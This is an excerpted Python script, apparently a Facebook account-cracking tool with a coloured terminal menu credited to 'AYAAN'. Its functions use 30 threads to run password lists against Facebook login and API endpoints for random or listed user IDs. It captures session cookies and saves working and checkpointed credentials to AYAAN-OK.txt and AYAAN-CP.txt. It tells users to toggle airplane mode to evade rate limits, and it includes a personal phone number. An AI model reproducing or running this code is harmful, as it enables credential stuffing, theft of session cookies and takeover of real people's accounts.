...
\033[1;32m  •   \033[1;33mCREATED BY\33[0;m   :  \033[1;32AYAAN

\033[1;32m  •   \033[1;32mFACEBOOK      : \033[1;34m Ali Raza XD

\033[1;32m  •   \033[1;35mGITHUB       :  \033[1;35mMahummad-Ayaan

\033[1;32m  •   \033[1;36mTOOL VERSION :  \033[1;36m1.0
...
#os.system("iuuuxdg-open https://www.facebook.com/waqas.ashraf.14268")
...
def Main():
	...
	if mani =='5':
		...
		os.system('xdg-open https://www.facebook.com/waqas.ashraf.14268')
...
def c():
	...
	print(" \033[1;37m[3] \033[1;34mINSTAGRAM")
	...
	if ok =='1':
		...
		os.system("xdg-open https://wa.me/+923213915156");Main()

	if ok =='2':

		os.system("xdg-open https://www.facebook.com/waqas.ashraf.14268");Main()

	if ok =='3':

		print("\033[0;97m Real Name :\033[0;92 Mahummad Ayaan ")
...
def R():
    ...
    with ThreadPool(max_workers=30) as yaari:
	    ...
	    print('\033[1;32m(√) Total IDs  :\033[1;32m '+tl);print('\033[1;35m(√) Chose Code : \033[1;32m%s'%(kode));print("\x1b[38;5;208m(!) Use flight (airplane) mode before use");print('\033[1;37m(<•>)══════════════════════════════════════════')
...
def eml():
    ...
    print("[•] FIRST NAME EXAMPLE : Raza,baloch...etc \n[•] LAST NAME EXAMPLE :raza,zoya...etc");linex()
    ...
    with ThreadPool(max_workers=30) as yaari:
        ...
        print("\x1b[38;5;208mUse flight (airplane) mode before use");print('\033[1;37m(<•>)══════════════════════════════════════════')
...
class Random:
    ...
    def __init__(self):
        ...
        print(" \033[1;97m[1] \033[1;93mCRACK RANDOM FACEBOOK ID 2004-09 ")
    ...
    def fbtua(self):
        ...
        try:
            ...
            with ThreadPoolExecutor(max_workers=30) as coeg:
                ...
                print("\x1b[38;5;208mUse flight (airplane) mode before use")
            ...
            print("%s\n\033[0;97m[+] \033[0;92mOK RESULTS SAVED IN -> AYAAN-OK.txt" % (G))

            print("%s\033[0;97m[+] \033[0;91mCP RESULTS SAVED IN -> AYAAN-CP.txt" % (Y))
    ...
    def api(self, uid, pwx):
        ...
        for pw in pwx:
            ...
            if "www.facebook.com" in response.json()["error_msg"]:
                ...
                print("\r \033[0;92m[RAZA-OK] %s √ %s\033[0;97m         " % (uid, pw))

                self.cp.append("%s√%s" % (uid, pw))

                open("AYAAN-OK.txt", "a").write("  %s√%s\n" % (uid, pw))
...
def rcrack1(uid,pwx,tl):
	...
	try:
		...
		for ps in pwx:
			...
			free_fb = session.get('https://m.facebook.com/home.php?paipv=0&eav=AfYgD9BcuI9Parp8KxUrcnd2Oepvq0IEkNj3lL7MstMK0eAuga_M8cPYp4xhTUAo-ww&tbua=1').text
    ...
    'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',
			...
			if 'c_user' in log_cookies:
				...
				print('\33[1;92m[RAZA-OK] '+uid+' √ '+ps+'\33[0;97m')

				print('%s[%sCOOKIE%s] : %s%s ' % (W,Y,W,G,coki))

				

				open('AYAAN-OK.txt', 'a').write(uid+' √ '+ps+'\n')
				...
				print('\33[1;91m[RAZA-CP] '+uid+' • '+ps+'\33[0;97m')

				open('AYAAN-CP.txt', 'a').write(uid+' • '+ps+'\n')
...
def file():
		...
		with tred(max_workers=30) as crack_submit:
			...
			print(f"\x1b[38;5;208mUse flight (airplane) mode before use");print('\033[1;37m(<•>)══════════════════════════════════════════')
...
def ffb(ids,names,passlist):
        ...
        sys.stdout.write(f'\r\r\033[1;37m[A Y A A N)] %s <•> OK:- \033[1;32m%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in Shahin:
                                ...
                                print(f'\r\r\033[1;32m[RAZA-OK] %s √ %s'%(ids,pas))

                                open(f'/sdcard/AYAAN-OK.txt', 'a').write(ids+' √ '+pas+'\n')
                                ...
                                if 'y' in cp:
                                        ...
                                        print(f'\r\r\033[1;37m[RAZA-CP] '+ids+' • '+pas+'\033[1;97m')

                                        open(f'/sdcard/AYAAN-CP.txt', 'a').write(ids+' • '+pas+'\n')
